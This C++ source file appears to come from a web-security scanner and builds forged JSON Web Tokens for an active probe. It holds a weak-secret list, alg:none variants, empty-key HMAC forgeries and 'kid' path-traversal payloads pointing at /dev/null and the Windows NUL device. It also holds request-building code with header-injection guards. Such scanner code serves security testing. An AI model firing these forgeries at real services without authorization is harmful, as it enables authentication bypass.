// Pure forgery/request builders for the active JWT probe, split out of
// jwt_probe.cpp so a unit test can link them (with the pure jwt_tool.cpp) against
// Qt6::Core alone -- testOneCarrier()/test() and their HttpClient (the Qt6::
// Network chain) stay in jwt_probe.cpp. Mirrors the established sibling pattern.
// corruptSignature's decoded-byte flip and buildRequest's CR/LF guards are
// load-bearing and previously untested.

#include "jwt_probe.hpp"
#include "jwt_tool.hpp"

#include <QJsonDocument>
#include <QJsonObject>
#include <QtGlobal>   // qAbs

namespace Nullock::Core::JwtProbe {

namespace {

QString b64url(const QByteArray &b) {
    return QString::fromLatin1(
        b.toBase64(QByteArray::Base64UrlEncoding | QByteArray::OmitTrailingEquals));
}
QByteArray b64urlDecode(const QString &s) {
    return QByteArray::fromBase64(s.toLatin1(),
        QByteArray::Base64UrlEncoding | QByteArray::OmitTrailingEquals);
}

} // namespace

// A small built-in HS256 secret list (used when the caller gives none). These
// are the secrets that actually show up in dev/copy-pasted configs.
QStringList defaultSecrets() {
    return { "secret", "password", "changeme", "your-256-bit-secret", "jwt",
             "jwtsecret", "jwt_secret", "key", "private", "test", "admin",
             "123456", "secretkey", "supersecret", "token", "qwerty" };
}

// A header name that, if forwarded on the NO-TOKEN calibration shot, could keep
// the request authorized by a secondary credential and skew calibration.
bool isCredentialHeader(const QString &name) {
    const QString n = name.toLower();
    return n == "cookie" || n == "authorization"
        || n.contains("auth") || n.contains("token")
        || n.contains("session") || n.contains("api-key") || n.contains("apikey");
}

// ---- Acceptance verdict (pure) -- see jwt_probe.hpp for the contract ------
bool forgeryAccepted(int xStatus, int xLen,
                     int validStatus, int validLen,
                     int rejStatus, int rejLen) {
    if (xStatus != validStatus) return false;
    // A reject baseline with a DIFFERENT status already distinguishes an
    // authorized-status forgery -- no body tiebreak (and reject's length, from
    // a different status, is not a meaningful reference). Only a shared status
    // (a body-only auth gate) lets length decide. Strict '<' so an exact
    // midpoint no longer auto-accepts.
    if (validStatus != rejStatus) return true;
    return qAbs(xLen - validLen) < qAbs(xLen - rejLen);
}

bool corruptLooksAuthorized(int xStatus, int xLen,
                            int validStatus, int validLen, int noAuthLen) {
    if (xStatus != validStatus) return false;
    // A server that does NOT verify the signature serves the corrupt token
    // from the SAME authorized handler, so its page is essentially identical
    // to valid. Require the corrupt length within 1/8 of the valid<->noAuth
    // span of valid -- a verbose "invalid token" reject page merely past the
    // midpoint sits well outside this neighbourhood and is not "accepted".
    const int span = qAbs(validLen - noAuthLen);
    return span == 0 ? xLen == validLen
                     : qAbs(xLen - validLen) * 8 <= span;   // <= 12.5% of span
}

bool corruptProbeAccepted(bool rejectHasBaseline,
                          int validStatus, int validLen,
                          int noAuthStatus, int noAuthLen,
                          int rejectStatus, int rejectLen) {
    // No usable forged-rejection baseline (the tampered probe was dropped) ->
    // we cannot judge the corrupt page's acceptance.
    if (!rejectHasBaseline) return false;
    // Status difference settles it with no body neighbourhood needed; a shared
    // status requires the absolute neighbourhood test.
    return (validStatus != noAuthStatus)
        ? forgeryAccepted(rejectStatus, rejectLen, validStatus, validLen,
                          noAuthStatus, noAuthLen)
        : corruptLooksAuthorized(rejectStatus, rejectLen, validStatus, validLen,
                                 noAuthLen);
}

QByteArray buildRequest(const Request &req, const QString &token) {
    if (req.method.contains('\r')   || req.method.contains('\n'))   return {};
    if (req.basePath.contains('\r') || req.basePath.contains('\n')) return {};
    if (req.host.contains('\r')     || req.host.contains('\n'))     return {};
    if (req.query.contains('\r')    || req.query.contains('\n'))    return {};
    if (token.contains('\r')        || token.contains('\n'))        return {};
    const QString target = req.query.isEmpty() ? req.basePath : req.basePath + "?" + req.query;

    QString authHeaderName = QStringLiteral("Authorization");
    QString authHeaderValue = "Bearer " + token;
    QString cookieName;
    if (req.location.startsWith("header:", Qt::CaseInsensitive)) {
        authHeaderName = req.location.mid(7);
        authHeaderValue = token;
    } else if (req.location.startsWith("cookie:", Qt::CaseInsensitive)) {
        cookieName = req.location.mid(7);
        authHeaderName.clear();
    }
    if (authHeaderName.contains('\r') || authHeaderName.contains('\n')) return {};
    if (cookieName.contains('\r')     || cookieName.contains('\n'))     return {};

    QByteArray out;
    out  = req.method.toUtf8() + " " + target.toUtf8() + " HTTP/1.1\r\n";
    out += "Host: " + req.host.toUtf8() + "\r\n";
    out += "User-Agent: Nullock/jwt\r\n";
    out += "Accept: */*\r\n";
    out += "Accept-Encoding: identity\r\n";
    // An empty token => send NO auth at all (the "is this endpoint gated?" probe).
    if (!token.isEmpty() && !authHeaderName.isEmpty())
        out += authHeaderName.toUtf8() + ": " + authHeaderValue.toUtf8() + "\r\n";
    if (!token.isEmpty() && !cookieName.isEmpty())
        out += "Cookie: " + cookieName.toUtf8() + "=" + token.toUtf8() + "\r\n";
    for (const auto &h : req.headers) {
        if (h.first.compare("Host", Qt::CaseInsensitive) == 0) continue;
        if (h.first.compare("Content-Length", Qt::CaseInsensitive) == 0) continue;
        // Drop carried framing/encoding headers that fight the ones this builder forces
        // (Accept-Encoding: identity line 72, Connection: close line 99/102, and its own
        // computed Content-Length line 98):
        //  - Accept-Encoding: else the server gzips and body-length grading is unreliable.
        //  - Transfer-Encoding: coexisting with the emitted Content-Length is a CL.TE
        //    smuggling/desync vector emitted by the scanner itself.
        //  - Connection: a carried "keep-alive" defeats the intended clean-close framing.
        if (h.first.compare("Accept-Encoding", Qt::CaseInsensitive) == 0) continue;
        if (h.first.compare("Transfer-Encoding", Qt::CaseInsensitive) == 0) continue;
        if (h.first.compare("Connection", Qt::CaseInsensitive) == 0) continue;
        if (!req.body.isEmpty() && h.first.compare("Content-Type", Qt::CaseInsensitive) == 0) continue;
        if (!authHeaderName.isEmpty()
            && h.first.compare(authHeaderName, Qt::CaseInsensitive) == 0) continue;
        // Drop EVERY secondary credential on BOTH the calibration and the
        // attack shots. The tested JWT is injected explicitly above (the
        // Authorization/Cookie carrier), so it stays the request's SOLE
        // credential -- otherwise a carried session Cookie keeps a cookie-auth
        // endpoint authorized on the forged-token shot too, and the no-token
        // vs forged differential is misreported as a signature/algorithm
        // bypass that does not exist. (The carrier header itself was already
        // dropped above, so this cannot strip the token we just set.)
        if (isCredentialHeader(h.first)) continue;
        if (h.first.contains('\r') || h.first.contains('\n')) continue;
        if (h.second.contains('\r') || h.second.contains('\n')) continue;
        out += h.first.toUtf8() + ": " + h.second.toUtf8() + "\r\n";
    }
    // A body rides on EVERY shot (only the token varies) so write/POST routes
    // that validate a body still calibrate.
    if (!req.body.isEmpty()) {
        const QString ct = req.contentType.isEmpty()
            ? QStringLiteral("application/json") : req.contentType;
        if (ct.contains('\r') || ct.contains('\n')) return {};   // no header injection via contentType
        out += "Content-Type: " + ct.toUtf8() + "\r\n";
        out += "Content-Length: " + QByteArray::number(req.body.size()) + "\r\n";
        out += "Connection: close\r\n\r\n";
        out += req.body;
    } else {
        out += "Connection: close\r\n\r\n";
    }
    return out;
}

// Invalidate the signature by flipping a byte of the DECODED signature (not a
// base64 char -- flipping the trailing char can land in dropped padding bits and
// round-trip to the SAME bytes for ~1/16 of tokens, which a correct verifier
// would then accept -> a false "signature not verified").
QString corruptSignature(const QString &token) {
    const QStringList parts = token.split('.');
    if (parts.size() < 3 || parts[2].isEmpty())
        return parts.mid(0, 2).join('.') + ".bm9wZXNpZ25hdHVyZQ";   // no sig -> add a junk one
    QByteArray sig = b64urlDecode(parts[2]);
    if (sig.isEmpty()) return parts[0] + "." + parts[1] + ".bm9wZQ";
    sig[0] = static_cast<char>(sig[0] ^ 0x01);                       // guaranteed-different byte
    return parts[0] + "." + parts[1] + "." + b64url(sig);
}

// alg:none bypass family -- servers that deny "none" case-sensitively, or check
// the allowlist before normalizing, miss these variants.
QStringList algNoneVariants(const JwtTool::Decoded &d) {
    static const char *kAlgs[] = { "none", "None", "NONE", "nOnE" };
    QStringList out;
    const QByteArray payload = b64url(QJsonDocument(d.payload).toJson(QJsonDocument::Compact)).toUtf8();
    for (const char *a : kAlgs) {
        QJsonObject h = d.header; h["alg"] = QString::fromLatin1(a);
        out << b64url(QJsonDocument(h).toJson(QJsonDocument::Compact)) + "." + payload + ".";
    }
    // empty-string alg and absent-alg header.
    { QJsonObject h = d.header; h["alg"] = QString();
      out << b64url(QJsonDocument(h).toJson(QJsonDocument::Compact)) + "." + payload + "."; }
    { QJsonObject h = d.header; h.remove("alg");
      out << b64url(QJsonDocument(h).toJson(QJsonDocument::Compact)) + "." + payload + "."; }
    return out;
}

// The HS family -- empty-key forgeries span all three so a server configured to
// HS384/HS512 (not just HS256) is still covered (signHmac dispatches on the
// header alg). Hardcoding HS256 would silently miss an HS384/512 victim.
static const char *kHsAlgs[] = { "HS256", "HS384", "HS512" };

// HMAC forgeries signed with an EMPTY key, one per HS alg. A server whose JWT
// signing secret is unset/blank (a real misconfig) HMAC-verifies one of these.
// Distinct from the weak-secret dictionary crack: "" is not a dictionary word and
// no crack is needed -- the key is known to be empty. alg is forced to the HS
// family so the test applies even to a captured RS/ES token (HMAC fall-back).
QStringList blankSecretVariants(const JwtTool::Decoded &d) {
    QStringList out;
    for (const char *a : kHsAlgs) {
        QJsonObject h = d.header;
        h["alg"] = QString::fromLatin1(a);
        out << JwtTool::signHmac(h, d.payload, QByteArray());
    }
    return out;
}

// `kid` header-injection forgeries. A malicious kid points the server's key
// LOOKUP at content the attacker controls; the canonical case is a path traversal
// to an empty/predictable file -- /dev/null or the Windows NUL device -- whose
// bytes are the EMPTY string, so the token is HMAC-signed with an empty key.
// A server that resolves kid to a file path and HMACs with its bytes then
// verifies our forgery. Variants cover plain and "..//"-doubled traversals plus
// the absolute device paths, each across the HS family. Claims are preserved (so
// the accept grading -- which compares the response to the valid baseline -- holds).
// NOTE: these share the empty key with blankSecretVariants(); the probe fires the
// kid finding only DIFFERENTIALLY (a kid token accepted while the no-kid empty-key
// token is rejected) so a plain blank-secret server isn't mislabeled as kid-driven.
QStringList kidInjectionVariants(const JwtTool::Decoded &d) {
    static const char *kKids[] = {
        "../../../../../../../../../../dev/null",
        "/dev/null",
        "....//....//....//....//....//dev/null",   // bypass a naive single "../" strip
        "..\\..\\..\\..\\..\\..\\..\\..\\NUL",        // Windows null device
    };
    QStringList out;
    for (const char *kid : kKids)
        for (const char *a : kHsAlgs) {
            QJsonObject h = d.header;
            h["alg"] = QString::fromLatin1(a);
            h["kid"] = QString::fromLatin1(kid);
            out << JwtTool::signHmac(h, d.payload, QByteArray());   // empty key == null-file contents
        }
    return out;
}

} // namespace Nullock::Core::JwtProbe
